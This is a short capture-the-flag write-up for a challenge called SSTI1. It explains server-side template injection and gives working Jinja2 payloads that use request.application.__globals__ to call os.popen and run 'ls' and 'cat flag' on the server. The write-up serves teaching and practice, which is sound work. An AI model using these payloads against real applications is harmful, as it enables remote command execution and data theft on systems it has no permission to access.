# 💉 SSTI1

## Description

I made a cool website where you can announce whatever you want! Try it out!

I heard templating is a cool and modular way to build web apps!

## Solution

I want to announce Hackers so I write Hacker in the field so it prints the same thing

This indictaes the **SSTI (Server Side Template Injection)** Vulnerability!

----

### SSTI Overview

SSTI (Server-Side Template Injection) is a web security vulnerability that happens when user input is inserted into a server-side template and executed as template code instead of plain text.

**In simple words**: If a web app uses templates (like Jinja2, Twig, Velocity, Freemarker) and does not properly sanitize user input, an attacker can inject template expressions that the server will evaluate, leading to data leakage or even remote code execution.

To test the vulnerability we will check `{{7*7}}` (Python Jinja2 Template Expression) so it should give `49` and it is confirmed!

Now we can use expressions to see the current list of directories: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`

There is our flag now we will `cat` this flag: `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`
